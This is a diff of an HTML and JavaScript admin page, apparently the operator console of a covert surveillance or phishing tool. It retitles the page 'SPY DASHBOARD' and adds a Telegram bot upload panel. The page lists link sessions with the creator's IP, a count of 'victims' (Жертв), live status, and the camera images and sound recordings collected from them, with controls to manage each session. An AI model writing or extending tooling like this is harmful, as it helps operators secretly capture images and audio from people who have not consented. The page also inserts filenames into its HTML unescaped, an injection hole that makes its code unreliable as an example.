@@ -14,256 +14,232 @@
         
         h1 { 
             text-align: center; color: #00ff99; 
-            text-shadow: 0 0 10px #00ff99; margin-bottom: 20px; letter-spacing: 2px;
+            text-shadow: 0 0 10px #00ff99; margin-bottom: 25px; letter-spacing: 2px;
         }
 
-        /* --- BOT BANNER START --- */
-        .bot-banner {
-            background: #112233;
-            border: 1px solid #00aaff;
-            border-radius: 8px;
-            padding: 15px;
-            margin-bottom: 30px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            box-shadow: 0 0 10px rgba(0, 170, 255, 0.2);
+        /* --- TG BOT SECTION --- */
+        .tg-container {
+            background: #0d1318; border: 1px solid #0088cc; border-radius: 8px;
+            padding: 15px; margin-bottom: 40px; box-shadow: 0 0 15px rgba(0, 136, 204, 0.1);
         }
-        .bot-info {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-        .bot-icon {
-            font-size: 30px;
-        }
-        .bot-text h3 {
-            margin: 0; color: #00aaff; font-size: 16px;
-        }
-        .bot-text p {
-            margin: 5px 0 0 0; color: #ccc; font-size: 12px;
-        }
-        .bot-btn {
-            background: #00aaff; color: black; text-decoration: none;
-            padding: 8px 15px; border-radius: 5px; font-weight: bold;
-            font-size: 12px; transition: 0.3s;
-        }
-        .bot-btn:hover { background: white; box-shadow: 0 0 10px white; }
-        /* --- BOT BANNER END --- */
-
-        .sessions-grid { 
-            display: grid; 
-            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); 
-            gap: 20px; 
-        }
-
-        .session-card { 
-            background: #151515; border: 1px solid #333; 
-            border-radius: 8px; padding: 15px; position: relative; 
-            display: flex; flex-direction: column;
-            box-shadow: 0 0 5px rgba(0,0,0,0.5);
-            transition: 0.3s;
-        }
-        .session-card:hover { border-color: #00ff99; box-shadow: 0 0 15px rgba(0, 255, 153, 0.15); }
-
-        .header { 
+        .tg-header { 
             display: flex; justify-content: space-between; align-items: center; 
-            border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 10px;
+            border-bottom: 1px solid #005580; padding-bottom: 10px; margin-bottom: 15px; 
         }
-        .room-id { font-size: 16px; font-weight: bold; color: #fff; }
-        .online-badge { 
-            background: #003300; color: #00ff99; padding: 2px 6px; 
-            border-radius: 4px; font-size: 11px; border: 1px solid #00ff99;
+        .tg-title { 
+            font-weight: bold; color: #00aaff; font-size: 18px; 
+            display: flex; align-items: center; gap: 10px; 
         }
+        .tg-grid { 
+            display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 12px; 
+        }
+        
+        .tg-file-card {
+            background: #151e26; border: 1px solid #004466; padding: 10px; border-radius: 6px;
+            display: flex; flex-direction: column; gap: 8px; font-size: 11px; position: relative;
+        }
+        .tg-file-card:hover { border-color: #00aaff; box-shadow: 0 0 10px rgba(0,170,255,0.1); }
+        
+        .tg-meta { display: flex; justify-content: space-between; color: #888; font-size: 10px; }
+        .tg-filename { color: #fff; font-weight: bold; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        
+        .tg-actions { display: flex; gap: 5px; margin-top: auto; }
+        .tg-btn { 
+            flex: 1; padding: 6px; border: none; border-radius: 4px; cursor: pointer; 
+            font-weight: bold; font-size: 10px; transition: 0.2s;
+        }
+        .btn-copy { background: #0077aa; color: white; }
+        .btn-copy:hover { background: #00aaff; }
+        .btn-del { background: #331111; color: #ff5555; border: 1px solid #552222; }
+        .btn-del:hover { background: #ff3333; color: white; }
 
-        .info-row { margin: 4px 0; font-size: 12px; color: #aaa; }
-        .info-label { color: #555; font-weight: bold; }
+        /* --- SESSIONS SECTION --- */
+        .section-title { border-bottom: 1px solid #333; padding-bottom: 5px; margin-bottom: 15px; color: #aaa; font-size: 14px; }
+        
+        .sessions-grid { 
+            display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; 
+        }
+        .session-card { 
+            background: #151515; border: 1px solid #333; border-radius: 8px; 
+            padding: 15px; display: flex; flex-direction: column; gap: 5px;
+            box-shadow: 0 0 5px rgba(0,0,0,0.5); 
+        }
+        .session-header { display: flex; justify-content: space-between; border-bottom: 1px solid #333; padding-bottom: 8px; margin-bottom: 5px; }
+        .room-id { font-weight: bold; color: white; }
+        .online-badge { background: #003300; color: #00ff99; padding: 2px 6px; border-radius: 4px; font-size: 10px; border: 1px solid #00ff99; }
+        
+        .info-row { font-size: 12px; color: #aaa; }
         .highlight { color: #00ff99; }
 
-        .files-section {
-            margin-top: 15px; border-top: 1px dashed #444; padding-top: 10px;
-            flex-grow: 1; 
+        .session-files { 
+            margin-top: 10px; background: #0f0f0f; padding: 8px; border-radius: 5px; max-height: 100px; overflow-y: auto; 
         }
-        .files-title { font-size: 11px; font-weight: bold; color: #00aaff; margin-bottom: 5px; text-transform: uppercase; }
+        .file-row { display: flex; justify-content: space-between; font-size: 11px; margin-bottom: 4px; border-bottom: 1px solid #222; padding-bottom: 2px; }
         
-        .file-list { 
-            max-height: 120px; overflow-y: auto; 
-            background: #0f0f0f; padding: 5px; border-radius: 4px;
+        .control-btn { 
+            width: 100%; background: #00ff99; border: none; padding: 10px; margin-top: 10px; 
+            cursor: pointer; font-weight: bold; border-radius: 5px; transition: 0.2s;
         }
-        
-        .file-item {
-            display: flex; justify-content: space-between; align-items: center;
-            background: #1a1a1a; padding: 5px; margin-bottom: 3px; border-radius: 3px;
-            font-size: 11px; border: 1px solid #222;
-        }
-        .file-info { display: flex; flex-direction: column; overflow: hidden; }
-        .file-name { color: #ddd; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 180px; }
-        .file-date { color: #555; font-size: 9px; }
-
-        .btn-download {
-            background: transparent; border: 1px solid #00aaff; color: #00aaff;
-            text-decoration: none; padding: 2px 5px; border-radius: 3px; font-size: 9px;
-            margin-left: 5px; transition: 0.2s; white-space: nowrap;
-        }
-        .btn-download:hover { background: #00aaff; color: black; }
-
-        .actions { display: flex; gap: 8px; margin-top: 15px; }
-        .control-btn, .del-btn {
-            flex: 1; padding: 10px; border: none; cursor: pointer; font-weight: bold;
-            font-family: inherit; border-radius: 5px; font-size: 11px; transition: 0.2s;
-        }
-        .control-btn { background: #00ff99; color: black; }
         .control-btn:hover { background: #00cc7a; }
-        .del-btn { background: #220000; color: #ff3366; border: 1px solid #550000; }
-        .del-btn:hover { background: #ff3366; color: white; border-color: #ff3366; }
+        .del-session-btn {
+            width: 100%; background: #220000; color: #ff5555; border: 1px solid #550000;
+            padding: 8px; margin-top: 5px; cursor: pointer; border-radius: 5px; font-size: 11px;
+        }
+        .del-session-btn:hover { background: #ff3333; color: white; }
 
+        .no-data { text-align: center; color: #555; padding: 20px; border: 1px dashed #333; }
+        
+        /* Scrollbar */
         ::-webkit-scrollbar { width: 5px; }
         ::-webkit-scrollbar-track { background: #111; }
         ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
-        
-        .no-data { grid-column: 1/-1; text-align: center; padding: 50px; color: #444; border: 1px dashed #333; }
-        
-        /* Mobile responsive for banner */
-        @media (max-width: 600px) {
-            .bot-banner { flex-direction: column; text-align: center; gap: 10px; }
-            .bot-info { flex-direction: column; }
-        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🛰️ GLOBAL MONITORING</h1>
+        <h1>🛰️ SPY DASHBOARD</h1>
 
-        <div class="bot-banner">
-            <div class="bot-info">
-                <div class="bot-icon">🤖</div>
-                <div class="bot-text">
-                    <h3>FILE UPLOADER BOT ACTIVE</h3>
-                    <p>Завантажуй файли через Telegram та отримуй посилання</p>
-                </div>
+        <div class="tg-container">
+            <div class="tg-header">
+                <div class="tg-title">🤖 TELEGRAM UPLOADS</div>
+                <a href="https://t.me/YOUR_BOT_USERNAME" target="_blank" style="color:#00aaff; text-decoration:none; font-size:12px;">[@ВІДКРИТИ БОТА]</a>
             </div>
-            <a href="https://t.me/live_ai_nfc_bot" target="_blank" class="bot-btn">ВІДКРИТИ БОТА ↗</a>
+            <div id="tg-grid" class="tg-grid">Loading bot files...</div>
         </div>
 
-        <div id="grid" class="sessions-grid">Waiting for data...</div>
+        <div class="section-title">ACTIVE SESSIONS</div>
+        <div id="grid" class="sessions-grid">Loading sessions...</div>
     </div>
 
     <script>
-        async function loadAllSessions() {
-            const container = document.getElementById('grid');
+        async function load() {
             try {
-                const res = await fetch('/sessions');
-                if (!res.ok) throw new Error("Server error");
-                const sessions = await res.json();
-
-                if (sessions.length === 0) {
-                    container.innerHTML = '<div class="no-data">НЕМАЄ АКТИВНИХ СЕСІЙ</div>';
-                    return;
-                }
-
-                container.innerHTML = '';
+                // Отримуємо дані з оновленого сервера
+                const r = await fetch('/sessions');
+                if(!r.ok) throw new Error("Server error");
                 
-                sessions.forEach(s => {
-                    const isActiveNow = (Date.now() - s.lastActiveAt) < 60000;
-                    
-                    const allFiles = [
-                        ...s.imagesFiles.map(f => ({...f, icon: '📷'})),
-                        ...s.soundsFiles.map(f => ({...f, icon: '🔊'}))
-                    ];
+                // Сервер тепер віддає об'єкт { sessions: [], botFiles: [] }
+                const data = await r.json();
+                
+                renderBotFiles(data.botFiles);
+                renderSessions(data.sessions);
 
-                    let filesHtml = '';
-                    if (allFiles.length > 0) {
-                        allFiles.reverse(); 
-                        
-                        const listItems = allFiles.map(f => `
-                            <div class="file-item">
-                                <div class="file-info">
-                                    <span class="file-name" title="${f.originalname}">${f.icon} ${f.originalname}</span>
-                                    <span class="file-date">${f.uploadedAt}</span>
-                                </div>
-                                <a href="${f.url}" download="${f.originalname}" target="_blank" class="btn-download">⬇ СКАЧАТИ</a>
-                            </div>
-                        `).join('');
-
-                        filesHtml = `
-                            <div class="files-section">
-                                <div class="files-title">📂 ФАЙЛИ (${allFiles.length}):</div>
-                                <div class="file-list">${listItems}</div>
-                            </div>
-                        `;
-                    } else {
-                        filesHtml = `
-                            <div class="files-section">
-                                <div class="files-title">📂 ФАЙЛИ:</div>
-                                <div style="color:#444; font-size:10px; padding:5px;">(Порожньо)</div>
-                            </div>
-                        `;
-                    }
-
-                    const card = document.createElement('div');
-                    card.className = 'session-card';
-                    card.innerHTML = `
-                        <div class="header">
-                            <span class="room-id">UID: ${s.id.slice(0, 8)}</span>
-                            <span class="online-badge">ONLINE: ${s.onlineCount}</span>
-                        </div>
-                        
-                        <div class="info-row"><span class="info-label">Лінк:</span> <a href="${s.fullUrl}" target="_blank" style="color:#00aaff">${s.shortCode || '...'}</a></div>
-                        <div class="info-row"><span class="info-label">Створено:</span> ${s.createdAt}</div>
-                        <div class="info-row"><span class="info-label">Автор IP:</span> ${s.creator.ip}</div>
-                        <div class="info-row"><span class="info-label">Девайс:</span> ${s.creator.device}</div>
-                        <div class="info-row"><span class="info-label">Жертв:</span> <span class="highlight">${s.totalVictims}</span></div>
-                        
-                        <div class="info-row" style="margin-top:5px;">
-                            Статус: ${isActiveNow ? '<span style="color:#00ff99;">● АКТИВНА</span>' : '<span style="color:#555;">○ СПИТЬ</span>'}
-                        </div>
-
-                        ${filesHtml}
-
-                        <div class="actions">
-                            <button class="control-btn" onclick="openControl('${s.id}')">👁️ КЕРУВАТИ</button>
-                            <button class="del-btn" onclick="deleteSession('${s.id}', this)">✖ ВИДАЛИТИ</button>
-                        </div>
-                    `;
-
-                    container.appendChild(card);
-                });
-            } catch (err) {
-                console.error(err);
-                container.innerHTML = '<div style="color:red; text-align:center;">Помилка з\'єднання з сервером.</div>';
+            } catch(e) { 
+                console.error(e); 
             }
         }
 
-        function openControl(id) {
-            prompt("Скопіюй ID сесії та встав його в URL (якщо потрібно) або в код:", id);
-            window.open(`/admin.html`, '_blank');
+        // --- 1. RENDER BOT FILES ---
+        function renderBotFiles(files) {
+            const c = document.getElementById('tg-grid');
+            
+            if(!files || files.length === 0) {
+                c.innerHTML = '<div style="grid-column:1/-1; text-align:center; color:#445;">Файлів немає. Надішли картинку або MP3 боту!</div>';
+                return;
+            }
+            
+            c.innerHTML = files.map(f => `
+                <div class="tg-file-card">
+                    <div class="tg-meta">
+                        <span>${f.type}</span>
+                        <span>${f.uploadedAt}</span>
+                    </div>
+                    <div class="tg-filename" title="${f.filename}">${f.filename}</div>
+                    <div class="tg-actions">
+                        <button class="tg-btn btn-copy" onclick="copyUrl('${f.url}')">COPY LINK</button>
+                        <button class="tg-btn btn-del" onclick="deleteBotFile('${f.filename}')">DEL</button>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        // --- 2. RENDER SESSIONS ---
+        function renderSessions(sessions) {
+            const c = document.getElementById('grid');
+            
+            if(!sessions || sessions.length === 0) {
+                c.innerHTML = '<div class="no-data">НЕМАЄ АКТИВНИХ СЕСІЙ</div>';
+                return;
+            }
+            
+            c.innerHTML = sessions.map(s => {
+                const isActive = (Date.now() - s.lastActiveAt) < 60000;
+                
+                // Збираємо файли сесії в купу
+                const sessionFiles = [
+                    ...s.imagesFiles.map(f => ({...f, icon: '📷'})),
+                    ...s.soundsFiles.map(f => ({...f, icon: '🔊'}))
+                ].reverse();
+
+                let filesHtml = '';
+                if(sessionFiles.length > 0) {
+                    filesHtml = `<div class="session-files">` + 
+                    sessionFiles.map(f => `
+                        <div class="file-row">
+                            <span title="${f.originalname}">${f.icon} ${f.originalname.slice(0,20)}</span>
+                            <a href="${f.url}" target="_blank" style="color:#00aaff;text-decoration:none;">⬇</a>
+                        </div>
+                    `).join('') + `</div>`;
+                } else {
+                    filesHtml = `<div style="font-size:10px; color:#555; margin-top:5px;">(Без файлів)</div>`;
+                }
+
+                return `
+                <div class="session-card">
+                    <div class="session-header">
+                        <span class="room-id">ID: ${s.id.slice(0,6)}..</span>
+                        <span class="online-badge">ON: ${s.onlineCount}</span>
+                    </div>
+                    
+                    <div class="info-row">Link: <a href="${s.fullUrl}" target="_blank" style="color:#00aaff">${s.shortCode || '...'}</a></div>
+                    <div class="info-row">IP: ${s.creator.ip}</div>
+                    <div class="info-row">Жертв: <span class="highlight">${s.totalVictims}</span></div>
+                    <div class="info-row">Статус: ${isActive ? '<span style="color:#00ff99">● LIVE</span>' : '<span style="color:#555">○ SLEEP</span>'}</div>
+
+                    ${filesHtml}
+
+                    <div style="margin-top:auto;">
+                        <button class="control-btn" onclick="openAdmin('${s.id}')">👁️ КЕРУВАТИ</button>
+                        <button class="del-session-btn" onclick="deleteSession('${s.id}', this)">✖ ВИДАЛИТИ</button>
+                    </div>
+                </div>
+                `;
+            }).join('');
+        }
+
+        // --- ACTIONS ---
+        function copyUrl(url) {
+            const fullUrl = window.location.origin + url;
+            navigator.clipboard.writeText(fullUrl).then(() => {
+                alert('Посилання скопійовано!');
+            });
+        }
+
+        async function deleteBotFile(filename) {
+            if(!confirm('Видалити цей файл?')) return;
+            try {
+                await fetch(`/bot-file/${filename}`, { method: 'DELETE' });
+                load(); // Оновлюємо
+            } catch(e) { alert('Помилка видалення'); }
         }
 
         async function deleteSession(id, btn) {
-            if (!confirm('Видалити сесію та ВСІ її файли? Цю дію неможливо скасувати.')) return;
-            
-            const originalText = btn.innerText;
-            btn.disabled = true;
+            if(!confirm('Видалити сесію?')) return;
             btn.innerText = '...';
-
             try {
-                const res = await fetch(`/session/${id}`, { method: 'DELETE' });
-                if (res.ok) {
-                    loadAllSessions();
-                } else {
-                    alert('Помилка при видаленні.');
-                    btn.innerText = originalText;
-                    btn.disabled = false;
-                }
-            } catch (e) {
-                alert('Помилка сервера.');
-                btn.innerText = originalText;
-                btn.disabled = false;
-            }
+                await fetch(`/session/${id}`, { method: 'DELETE' });
+                load();
+            } catch(e) { alert('Помилка видалення'); }
         }
 
-        loadAllSessions();
-        setInterval(loadAllSessions, 4000);
+        function openAdmin(id) {
+            prompt("Скопіюй ID для входу в адмінку:", id);
+            window.open('/admin.html', '_blank');
+        }
+
+        // Автооновлення кожні 3 секунди
+        load();
+        setInterval(load, 3000);
     </script>
 </body>
 </html>
